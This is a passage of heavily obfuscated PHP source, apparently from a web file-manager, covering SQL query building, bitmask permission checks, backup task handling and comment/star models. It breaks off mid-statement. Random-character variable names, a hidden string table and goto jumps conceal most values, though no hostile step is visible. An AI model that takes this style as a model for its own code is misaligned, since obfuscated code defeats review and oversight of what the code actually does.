$this->parseComment(!empty($œˆƒŒøê[$åÁì∂§‹[358]]) ? $œˆƒŒøê[$åÁì∂§‹[358]] : $åÁì∂§‹[12]); return $this->execute($Û¿∆†ÀŒ, $this->parseBind(!empty($œˆƒŒøê[$åÁì∂§‹[289]]) ? $œˆƒŒøê[$åÁì∂§‹[289]] : array())); } public function select($Èﬂ≥’‘© = array()) { $¢˜Â–É≤ =& $_SERVER[ëæªã÷]; $this->model = $Èﬂ≥’‘©[$¢˜Â–É≤[285]]; $–åÁ≥≈Å = $this->buildSelectSql($Èﬂ≥’‘©); $óﬁœÁ®º = isset($Èﬂ≥’‘©[$¢˜Â–É≤[353]]) ? $Èﬂ≥’‘©[$¢˜Â–É≤[353]] : !1; if ($óﬁœÁ®º) { $ã√‡ÃÏ¥ = is_string($óﬁœÁ®º[$¢˜Â–É≤[105]]) ? $óﬁœÁ®º[$¢˜Â–É≤[105]] : $¢˜Â–É≤[1019] . md5($–åÁ≥≈Å); $û¶©à”® = think_cache($ã√‡ÃÏ¥, $¢˜Â–É≤[12], $óﬁœÁ®º); if (!1 !== $û¶©à”®) { return $û¶©à”®; } } $Ø∆≤í˚ = $this->query($–åÁ≥≈Å, $this->parseBind(!empty($Èﬂ≥’‘©[$¢˜Â–É≤[289]]) ? $Èﬂ≥’‘©[$¢˜Â–É≤[289]] : array())); if ($óﬁœÁ®º && !1 !== $Ø∆≤í˚) { think_cache($ã√‡ÃÏ¥, $Ø∆≤í˚, $óﬁœÁ®º); } return $Ø∆≤í˚; } public function buildSelectSql($…⁄≤Ÿ…§ = array()) { $îóπ†˚û =& $_SERVER[ëæªã÷]; if (isset($…⁄≤Ÿ…§[$îóπ†˚û[357]])) { if (strpos($…⁄≤Ÿ…§[$îóπ†˚û[357]], $îóπ†˚û[50])) { list($â¯âô®æ, $‘◊˘Øñ¶) = explode($îóπ†˚û[50], $…⁄≤Ÿ…§[$îóπ†˚û[357]]); } else { $â¯âô®æ = $…⁄≤Ÿ…§[$îóπ†˚û[357]]; } $â¯âô®æ = $â¯âô®æ ? $â¯âô®æ : 1; $‘◊˘Øñ¶ = isset($‘◊˘Øñ¶) ? $‘◊˘Øñ¶ : (is_numeric($…⁄≤Ÿ…§[$îóπ†˚û[296]]) ? $…⁄≤Ÿ…§[$îóπ†˚û[296]] : 20); $∆∞ãı°˝ = $‘◊˘Øñ¶ * ((int) $â¯âô®æ - 1); $…⁄≤Ÿ…§[$îóπ†˚û[296]] = $∆∞ãı°˝ . $îóπ†˚û[50] . $‘◊˘Øñ¶; } if (think_config($îóπ†˚û[1020])) { $ê¯Öπ˚¬ = $îóπ†˚û[1021] . md5(serialize($…⁄≤Ÿ…§)); $‰ÍçËÑµ = think_cache($ê¯Öπ˚¬); if ($‰ÍçËÑµ) { return $‰ÍçËÑµ; } } $‘óªØÓñ = $this->parseSql($this->selectSql, $…⁄≤Ÿ…§); $‘óªØÓñ .= $this->parseLock(isset($…⁄≤Ÿ…§[$îóπ†˚û[823]]) ? $…⁄≤Ÿ…§[$îóπ†˚û[823]] : !1); if (isset($ê¯Öπ˚¬)) { think_cache($ê¯Öπ˚¬, $‘óªØÓñ); } return $‘óªØÓñ; } public function parseSql($œÔøï÷æ, $äÙÿ˙Èƒ = array()) { $‰ªﬂ‚¯¨ =& $_SERVER[ëæªã÷]; $œÔøï÷æ = str_replace(array($‰ªﬂ‚¯¨[1022], $‰ªﬂ‚¯¨[1023], $‰ªﬂ‚¯¨[1024], $‰ªﬂ‚¯¨[1025], $‰ªﬂ‚¯¨[1026], $‰ªﬂ‚¯¨[1027], $‰ªﬂ‚¯¨[1028], $‰ªﬂ‚¯¨[1029], $‰ªﬂ‚¯¨[1030], $‰ªﬂ‚¯¨[1031], $‰ªﬂ‚¯¨[1032]), array($this->parseTable("{$äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[283]]}"), $this->parseDistinct(isset($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[1033]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[1033]] : !1), $this->parseField(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[277]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[277]] : $‰ªﬂ‚¯¨[191]), $this->parseJoin(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[286]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[286]] : $‰ªﬂ‚¯¨[12]), $this->parseWhere(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[279]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[279]] : $‰ªﬂ‚¯¨[12]), $this->parseGroup(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[515]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[515]] : $‰ªﬂ‚¯¨[12]), $this->parseHaving(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[1034]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[1034]] : $‰ªﬂ‚¯¨[12]), $this->parseOrder(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[369]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[369]] : $‰ªﬂ‚¯¨[12]), $this->parseLimit(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[296]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[296]] : $‰ªﬂ‚¯¨[12]), $this->parseUnion(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[351]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[351]] : $‰ªﬂ‚¯¨[12]), $this->parseComment(!empty($äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[358]]) ? $äÙÿ˙Èƒ[$‰ªﬂ‚¯¨[358]] : $‰ªﬂ‚¯¨[12])), $œÔøï÷æ); return $œÔøï÷æ; } public function getLastSql($Úã˛ö˚™ = '') { return $Úã˛ö˚™ ? $this->modelSql[$Úã˛ö˚™] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($◊ä¨¬ú‰) { return addslashes($◊ä¨¬ú‰); } public function setModel($á¬Ã®õ›) { $this->model = $á¬Ã®õ›; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } $_file = $_SERVER[$_SERVER[ëæªã÷][69]]; goto E‹Â‹ß¨ùó; B∞ï“›ˆŸã: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $π—ı˛¨ò =& $_SERVER[ëæªã÷]; $…’™˙åü = array(array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1797]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1799], $π—ı˛¨ò[1800] => 1, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1803]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1804], $π—ı˛¨ò[1800] => 2, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1805]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1806], $π—ı˛¨ò[1800] => 3, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1807]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1808], $π—ı˛¨ò[1800] => 4, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_VIEW), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1809]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1810], $π—ı˛¨ò[1800] => 5, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1811]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1812], $π—ı˛¨ò[1800] => 6, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($π—ı˛¨ò[421] => LNG($π—ı˛¨ò[1813]), $π—ı˛¨ò[1798] => $π—ı˛¨ò[1814], $π—ı˛¨ò[1800] => 7, $π—ı˛¨ò[1801] => 1, $π—ı˛¨ò[1802] => 0)); return $…’™˙åü; } public static function authCheck($øÓâç˙…, $£∂ø˝®†) { $øÓâç˙… = intval($øÓâç˙…); if ($GLOBALS[$_SERVER[ëæªã÷][505]]) { return !0; } if ($øÓâç˙… <= 0) { return !1; } if (($øÓâç˙… & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($øÓâç˙… & $£∂ø˝®†); } public static function authCheckShow($πÃÚ⁄˛Å) { return self::authCheck($πÃÚ⁄˛Å, self::AUTH_SHOW); } public static function authCheckView($¿∏ÿÂåÃ) { return self::authCheck($¿∏ÿÂåÃ, self::AUTH_VIEW); } public static function authCheckDownload($æÏ‰Ÿï≈) { return self::authCheck($æÏ‰Ÿï≈, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ô∆ë—€·) { return self::authCheck($ô∆ë—€·, self::AUTH_UPLOAD); } public static function authCheckEdit($⁄¥∆Ä”Ç) { return self::authCheck($⁄¥∆Ä”Ç, self::AUTH_EDIT); } public static function authCheckRemove($≠∑∂ì’¡) { return self::authCheck($≠∑∂ì’¡, self::AUTH_REMOVE); } public static function authCheckShare($êè¥…Œ€) { return self::authCheck($êè¥…Œ€, self::AUTH_SHARE); } public static function authCheckComment($Çåªœﬂ⁄) { return self::authCheck($Çåªœﬂ⁄, self::AUTH_COMMENT); } public static function authCheckEvent($©‰ºŸåÆ) { return self::authCheck($©‰ºŸåÆ, self::AUTH_EVENT); } public static function authCheckRoot($˜…â∏÷¶) { return self::authCheck($˜…â∏÷¶, self::AUTH_ROOT); } public static function authCheckAction($˜ÉıÛ˝≤, $∫∂¡Å¸¶) { $Í˛˘ä˜· =& $_SERVER[ëæªã÷]; $˜¨£Î‡˛ = array($Í˛˘ä˜·[1815] => self::AUTH_VIEW, $Í˛˘ä˜·[1173] => self::AUTH_DOWNLOAD, $Í˛˘ä˜·[118] => self::AUTH_UPLOAD, $Í˛˘ä˜·[1766] => self::AUTH_EDIT, $Í˛˘ä˜·[1765] => self::AUTH_REMOVE, $Í˛˘ä˜·[1776] => self::AUTH_SHARE, $Í˛˘ä˜·[358] => self::AUTH_COMMENT, $Í˛˘ä˜·[1616] => self::AUTH_EVENT, $Í˛˘ä˜·[1816] => self::AUTH_ROOT); if (!isset($˜¨£Î‡˛[$∫∂¡Å¸¶])) { return; } $≥ÀØÍ≈¡ = $˜¨£Î‡˛[$∫∂¡Å¸¶]; $˜ÉıÛ˝≤ = intval($˜ÉıÛ˝≤); if ($˜ÉıÛ˝≤ <= 0) { return !1; } if (($˜ÉıÛ˝≤ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($˜ÉıÛ˝≤ & $≥ÀØÍ≈¡); } public static function authDisable($–ª´õ‰Ü, $ºÕÊœà‹) { if (intval($–ª´õ‰Ü) <= 0) { return 0; } return intval($–ª´õ‰Ü) & ~$ºÕÊœà‹; } public $optionType = "\123\171\163\164\x65\x6d\56\x73\x6f\165\x72\x63\145\101\165\164\x68\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\x70\154\141\x79", "\x73\171\163\164\x65\155", "\163\x6f\x72\164"); public function initData() { $öœ◊·Èà = $this->authDefault(); foreach ($öœ◊·Èà as $à∆âÍ≠ï) { $this->add($à∆âÍ≠ï); } } public function findAuth($ÌÍÆ˝†é, $–¥Â¨·ß) { $…Ì¶ı∂Ç =& $_SERVER[ëæªã÷]; $¸”‘µ⁄∂ = parent::listData(); foreach ($¸”‘µ⁄∂ as $¿·íúáõ) { $•™πÒπÅ = intval($¿·íúáõ[$…Ì¶ı∂Ç[414]]); if ($•™πÒπÅ <= 0 || $¿·íúáõ[$…Ì¶ı∂Ç[1817]] == 0) { continue; } if (($•™πÒπÅ & $ÌÍÆ˝†é) != $ÌÍÆ˝†é) { continue; } if (($•™πÒπÅ & $–¥Â¨·ß) != 0) { continue; } return $¿·íúáõ[$…Ì¶ı∂Ç[401]]; } return !1; } public function findAuthReadOnly() { $ƒÓíé‚π = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $–´ˆº±˜ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ƒÓíé‚π, $–´ˆº±˜); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($Â¿èíﬁÇ = false, $ÊÌÙıÿ¸ = "\163\157\162\164", $Œ¸ì≥°∫ = false) { return parent::listData($Â¿èíﬁÇ, $ÊÌÙıÿ¸, $Œ¸ì≥°∫); } public function update($ºﬂ¡Ö§ù, $·úû¢—‡) { $ ÷Ó≥∏‡ =& $_SERVER[ëæªã÷]; $™ä‘Í˝∫ = parent::listData($ºﬂ¡Ö§ù); $íá⁄§à˘ = $this->findByName($·úû¢—‡[$ ÷Ó≥∏‡[32]]); if (!$™ä‘Í˝∫ || $íá⁄§à˘ && $íá⁄§à˘[$ ÷Ó≥∏‡[401]] != $™ä‘Í˝∫[$ ÷Ó≥∏‡[401]]) { return !1; } $this->filterAuth($·úû¢—‡[$ ÷Ó≥∏‡[414]]); return parent::update($ºﬂ¡Ö§ù, $·úû¢—‡); } public function remove($ËáÍçí€) { $‘ÅΩã¡É = parent::listData($ËáÍçí€); if (!$‘ÅΩã¡É || $‘ÅΩã¡É[$_SERVER[ëæªã÷][1250]]) { return !1; } return parent::remove($ËáÍçí€); } public function add($ô¬ﬁ£ûΩ = array()) { $†íï›Âπ =& $_SERVER[ëæªã÷]; if ($this->findByName($ô¬ﬁ£ûΩ[$†íï›Âπ[32]])) { return !1; } $˜òåÄË≤ = array($†íï›Âπ[32] => $†íï›Âπ[12], $†íï›Âπ[414] => 1, $†íï›Âπ[1818] => $†íï›Âπ[1806], $†íï›Âπ[1817] => 1, $†íï›Âπ[1250] => 0, $†íï›Âπ[1819] => 0); $ô¬ﬁ£ûΩ = array_merge($˜òåÄË≤, $ô¬ﬁ£ûΩ); $ô¬ﬁ£ûΩ[$†íï›Âπ[1819]] = $this->getSort(); $this->filterAuth($ô¬ﬁ£ûΩ[$†íï›Âπ[414]]); return parent::insert($ô¬ﬁ£ûΩ); } private function getSort() { $Ω‡—∏ññ =& $_SERVER[ëæªã÷]; $ì©†◊Êﬂ = parent::listData(); $ç„Îæîï = array_to_keyvalue($ì©†◊Êﬂ, $Ω‡—∏ññ[12], $Ω‡—∏ññ[1819]); return empty($ç„Îæîï) ? 0 : max($ç„Îæîï) + 1; } private function filterAuth(&$›Ò´¥„‡) { if (!$›Ò´¥„‡) { return; } $ì”ÔŒ◊Ä = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $€≠£◊õ‰ = array(); foreach ($ì”ÔŒ◊Ä as $«πû”¯´) { if ($›Ò´¥„‡ & $«πû”¯´) { $€≠£◊õ‰[] = $«πû”¯´; } } if (in_array(self::AUTH_ROOT, $€≠£◊õ‰)) { $›Ò´¥„‡ = array_sum($ì”ÔŒ◊Ä); return; } $‡˙Å±∑¯ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($€≠£◊õ‰ as $«πû”¯´) { if (isset($‡˙Å±∑¯[$«πû”¯´])) { $€≠£◊õ‰ = array_merge($€≠£◊õ‰, $‡˙Å±∑¯[$«πû”¯´]); } } $€≠£◊õ‰[] = self::AUTH_SHOW; $›Ò´¥„‡ = array_sum(array_unique($€≠£◊õ‰)); } public function sort($˛‰„éÅã, $Ã£Äﬂ∫Ë) { return parent::update($˛‰„éÅã, $Ã£Äﬂ∫Ë); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\142\x61\143\x6b\x75\160\114\151\x73\164"; public $field = array("\x69\157", "\x6e\141\155\145", "\x73\x74\x61\x74\165\163", "\143\157\156\x74\145\x6e\x74", "\155\x61\x6e\165\141\x6c", "\x72\145\163\x75\154\164", "\x74\x69\155\145\x46\162\x6f\x6d", "\164\151\155\x65\x54\x6f"); public function config() { $¬â¡˝ââ =& $_SERVER[ëæªã÷]; $πëÒΩ»Ò = Model($¬â¡˝ââ[750])->get($¬â¡˝ââ[760]); $πëÒΩ»Ò = json_decode($πëÒΩ»Ò, !0); $πëÒΩ»Ò = is_array($πëÒΩ»Ò) ? $πëÒΩ»Ò : array(); if (!isset($πëÒΩ»Ò[$¬â¡˝ââ[735]])) { $πëÒΩ»Ò[$¬â¡˝ââ[735]] = $¬â¡˝ââ[99]; } unset($πëÒΩ»Ò[$¬â¡˝ââ[1598]]); Action($¬â¡˝ââ[1820])->taskInit(); Model($¬â¡˝ââ[1597])->cacheClear(); $éõã˚≈Ê = $¬â¡˝ââ[1821]; $çöÒ∏Â÷ = Model($¬â¡˝ââ[1822])->findByKey($¬â¡˝ââ[1616], $éõã˚≈Ê); if (!$çöÒ∏Â÷) { $çöÒ∏Â÷ = array(); } if (isset($çöÒ∏Â÷[$¬â¡˝ââ[206]])) { $çöÒ∏Â÷[$¬â¡˝ââ[206]] = json_decode($çöÒ∏Â÷[$¬â¡˝ââ[206]], !0); } if (isset($πëÒΩ»Ò[$¬â¡˝ââ[206]])) { $çöÒ∏Â÷[$¬â¡˝ââ[206]][$¬â¡˝ââ[1601]] = $πëÒΩ»Ò[$¬â¡˝ââ[206]]; unset($πëÒΩ»Ò[$¬â¡˝ââ[206]]); } return array_merge($çöÒ∏Â÷, $πëÒΩ»Ò); } public function listData($¯ë’ã¿Ï = false, $ç ‘®—ƒ = "\155\x6f\x64\x69\146\171\x54\151\x6d\x65", $˚¥ËÃ–± = false) { return parent::listData($¯ë’ã¿Ï, $ç ‘®—ƒ, !0); } public function lastItem() { $ÚÕá»¬⁄ = $this->listData(); return !empty($ÚÕá»¬⁄[0]) ? $ÚÕá»¬⁄[0] : null; } public function kill($ñú“¿ÛÅ) { $ñ¢…äÁ° =& $_SERVER[ëæªã÷]; $®Ñ§Ôª = $this->listData($ñú“¿ÛÅ); if (!$®Ñ§Ôª || empty($®Ñ§Ôª[$ñ¢…äÁ°[32]])) { return !0; } Task::kill($ñ¢…äÁ°[759]); Task::kill($ñ¢…äÁ°[780]); Task::kill($ñ¢…äÁ°[789]); $êâª¢Úà = $®Ñ§Ôª[$ñ¢…äÁ°[32]]; $◊Ÿõû¡Ò = TEMP_FILES . $ñ¢…äÁ°[758] . $êâª¢Úà . $ñ¢…äÁ°[8]; IO::remove($◊Ÿõû¡Ò, !1); return $this->remove($ñú“¿ÛÅ); } public function remove($πÔÚÛ®É) { $«ëÇ“Ωè = $this->listData($πÔÚÛ®É); if (!$«ëÇ“Ωè) { return !0; } return $this->backupRemove($«ëÇ“Ωè); } private function backupRemove($ªïÉñ∂Ô) { parent::remove($ªïÉñ∂Ô[$_SERVER[ëæªã÷][401]]); $‘ÄÊ‹¸“ = $this->backupPath($ªïÉñ∂Ô); IO::remove($‘ÄÊ‹¸“, !1); return !0; } private function backupPath($òäıºó») { $®ŒÌ“‡Î =& $_SERVER[ëæªã÷]; $¯çÆöè˝ = $òäıºó»[$®ŒÌ“‡Î[32]]; $è¶ò÷ÈÚ = Model($®ŒÌ“‡Î[750])->get($®ŒÌ“‡Î[751]); $·€È∞Ü‘ = substr(md5($®ŒÌ“‡Î[752] . $è¶ò÷ÈÚ . $¯çÆöè˝), 0, 8); return "\173\151\157\x3a{$òäıºó»[$®ŒÌ“‡Î[732]]}\175\57\144\x61\x74\x61\142\141\163\145\57\x62\141\143\153\x75\x70\x2f" . $¯çÆöè˝ . $®ŒÌ“‡Î[11] . $·€È∞Ü‘; } public function start() { $ß∂äéÔ° =& $_SERVER[ëæªã÷]; if ($GLOBALS[$ß∂äéÔ°[6]][$ß∂äéÔ°[100]][$ß∂äéÔ°[1823]] != $ß∂äéÔ°[99]) { return !0; } $∂ì…¡óç = $this->config(); if (!$∂ì…¡óç || $∂ì…¡óç[$ß∂äéÔ°[1598]] != $ß∂äéÔ°[99]) { return !1; } $öÚÿÂæ† = $this->process(); foreach ($öÚÿÂæ† as $Ãà—ƒ©») { if ($Ãà—ƒ©») { return Task::restart($Ãà—ƒ©»[$ß∂äéÔ°[401]]); } } $◊†π≥Å∆ = new Backup(); $è‹´ÄÔ± = $◊†π≥Å∆->db(); if ($è‹´ÄÔ±) { $è‹´ÄÔ± = $◊†π≥Å∆->dbFile(); if ($è‹´ÄÔ± && $∂ì…¡óç[$ß∂äéÔ°[735]] == $ß∂äéÔ°[200]) { $è‹´ÄÔ± = $◊†π≥Å∆->file(); } } Backup::set(array($ß∂äéÔ°[730] => 1, $ß∂äéÔ°[496] => time())); return !0; } public function process() { $‘íø¬◊Ñ =& $_SERVER[ëæªã÷]; $ñ€õÒº≈ = array($‘íø¬◊Ñ[738] => Task::get($‘íø¬◊Ñ[759]), $‘íø¬◊Ñ[742] => Task::get($‘íø¬◊Ñ[780]), $‘íø¬◊Ñ[202] => Task::get($‘íø¬◊Ñ[789])); $æ‰ÀﬁÔì = !1; foreach ($ñ€õÒº≈ as &$≤Ûµ‡ÆÈ) { if ($æ‰ÀﬁÔì) { $≤Ûµ‡ÆÈ = !1; continue; } if ($≤Ûµ‡ÆÈ) { $¢Ò≥Ó≠∂ = intval(_get($≤Ûµ‡ÆÈ, $‘íø¬◊Ñ[1633], 0)); if (time() - $¢Ò≥Ó≠∂ > 7200) { Task::kill($≤Ûµ‡ÆÈ[$‘íø¬◊Ñ[401]]); $æ‰ÀﬁÔì = !0; $≤Ûµ‡ÆÈ = !1; } } } return $ñ€õÒº≈; } public function restore() { $∫ÓåΩãÄ =& $_SERVER[ëæªã÷]; ActionCall($∫ÓåΩãÄ[1036], !0, 1); ActionCall($∫ÓåΩãÄ[1036], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\155\145" => "\143\x6f\x6d\155\x65\156\x74\x5f\x6d\x65\x74\x61", "\x6d\x65\164\141\x46\151\x65\x6c\144" => "\143\x6f\x6d\155\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ï…ﬁëƒÚ) { $û¥Ÿñœó =& $_SERVER[ëæªã÷]; if ($ï…ﬁëƒÚ[$û¥Ÿñœó[1824]]) { $≠Êµæµ = $this->where(array($û¥Ÿñœó[1825] => $ï…ﬁëƒÚ[$û¥Ÿñœó[1824]]))->find(); if (!$≠Êµæµ || $≠Êµæµ[$û¥Ÿñœó[412]] != $ï…ﬁëƒÚ[$û¥Ÿñœó[412]] || $≠Êµæµ[$û¥Ÿñœó[504]] != $ï…ﬁëƒÚ[$û¥Ÿñœó[504]]) { return !1; } $this->where(array($û¥Ÿñœó[1825] => $ï…ﬁëƒÚ[$û¥Ÿñœó[1824]]))->setAdd($û¥Ÿñœó[1826], 1); } $ï…ﬁëƒÚ[$û¥Ÿñœó[1827]] = 0; $ï…ﬁëƒÚ[$û¥Ÿñœó[1826]] = 0; $ï…ﬁëƒÚ[$û¥Ÿñœó[730]] = 1; return $this->add($ï…ﬁëƒÚ); } public function commentCount($ø¡‹…∂ß, $’©˜‡Àæ, $·˙™Áóµ = false) { $µ›≥ﬁ∞· =& $_SERVER[ëæªã÷]; if (!$ø¡‹…∂ß) { return array(); } if (is_string($ø¡‹…∂ß) || is_int($ø¡‹…∂ß)) { $ø¡‹…∂ß = array($ø¡‹…∂ß); } $ ú⁄ΩÕŒ = array($µ›≥ﬁ∞·[504], $µ›≥ﬁ∞·[1828] => $µ›≥ﬁ∞·[500]); $É⁄¿›åŒ = array($µ›≥ﬁ∞·[504] => array($µ›≥ﬁ∞·[7], $ø¡‹…∂ß), $µ›≥ﬁ∞·[412] => $’©˜‡Àæ); if ($·˙™Áóµ) { $É⁄¿›åŒ[$µ›≥ﬁ∞·[1628]] = $·˙™Áóµ; } $µÇõÌ¥˛ = $this->field($ ú⁄ΩÕŒ)->where($É⁄¿›åŒ)->group($µ›≥ﬁ∞·[504])->select(); return array_to_keyvalue($µÇõÌ¥˛, $µ›≥ﬁ∞·[504], $µ›≥ﬁ∞·[500]); } public function starTarget($ö⁄”Öáœ, $îØ„¬ñ˛) { $îôÆ«∑Ó =& $_SERVER[ëæªã÷]; $Ù≠„Öñ∂ = $ö⁄”Öáœ + self::TYPE_STAR_OFFSET; $ï∫®éÅâ = array($îôÆ«∑Ó[1628] => USER_ID, $îôÆ«∑Ó[412] => $Ù≠„Öñ∂, $îôÆ«∑Ó[504] => $îØ„¬ñ˛); $∂†ßæçË = $this->where($ï∫®éÅâ)->find(); if ($∂†ßæçË) { return $this->where(array($îôÆ«∑Ó[401] => $∂†ßæçË[$îôÆ«∑Ó[401]]))->delete(); } $Øï∑’˙î = array($îôÆ«∑Ó[1824] => 0, $îôÆ«∑Ó[1628] => USER_ID, $îôÆ«∑Ó[730] => 1, $îôÆ«∑Ó[735] => $îôÆ«∑Ó[12], $îôÆ«∑Ó[412] => $Ù≠„Öñ∂, $îôÆ«∑Ó[504] => $îØ„¬ñ˛, $îôÆ«∑Ó[1827] => 0, $îôÆ«∑Ó[1826] => 0); return $this->add($Øï∑’˙î); } public function starTargetCount($í°œ±˜”, $›Æàìö®) { $∂¢∞°æÒ =& $_SERVER[ëæªã÷]; $‡à◊›ƒﬁ = $›Æàìö® + self::TYPE_STAR_OFFSET; $˘ı≤öËí = $this->commentCount($í°œ±˜”, $‡à◊›ƒﬁ); $è ﬁ±œö = $this->commentCount($í°œ±˜”, $‡à◊›ƒﬁ, USER_ID); return array($∂¢∞°æÒ[1829] => $˘ı≤öËí, $∂¢∞°æÒ[1830] => $è ﬁ±œö); } public function starTargetUserList($î≤Ú£˜», $ÏŸ≤çÃª) { $ˆàÊ˛òå =& $_SERVER[ëæªã÷]; $¨‹π≤Ù≈ = $î≤Ú£˜» + self::TYPE_STAR_OFFSET; $«§Ö·Ô = array($ˆàÊ˛òå[504] => $ÏŸ≤çÃª, $ˆàÊ˛òå[412] => $¨‹π≤Ù≈); $≥∆ºØä— = $this->where($«§Ö·Ô)->count(); $ﬂ§≠¥ª¨ = array($ˆàÊ˛òå[259] => $≥∆ºØä—, $ˆàÊ˛òå[1831] => array()); if (!$≥∆ºØä—) { return $ﬂ§≠¥ª¨; } $ †˘‚ß› = $this->field($ˆàÊ˛òå[1628])->where($«§Ö·Ô)->limit(500)->select(); $ †˘‚ß› = array_to_keyvalue($ †˘‚ß›, $ˆàÊ˛òå[12], $ˆàÊ˛òå[1628]); $ﬂ§≠¥ª¨[$ˆàÊ˛òå[1831]] = Model($ˆàÊ˛òå[513])->userListInfo($ †˘‚ß›); return $ﬂ§≠¥ª¨; } public function prasiseUserList($ÃâÎ˚ï) { $œ∂ñ®ç∂ =& $_SERVER[ëæªã÷]; $•ãñâÓî = array($œ∂ñ®ç∂[1832] => $ÃâÎ˚ï); $√ºõÛ‹∂ = $this->where($•ãñâÓî)->find(); $†∂ùØ≥¬ = _get($√ºõÛ‹∂, $œ∂ñ®ç∂[1827], 0); $©”∫Ê¸ª = array($œ∂ñ®ç∂[259] => $†∂ùØ≥¬, $œ∂ñ®ç∂[1831] => array()); if (!$†∂ùØ≥¬) { return $©”∫Ê¸ª; } $à≠ñº«∏ = 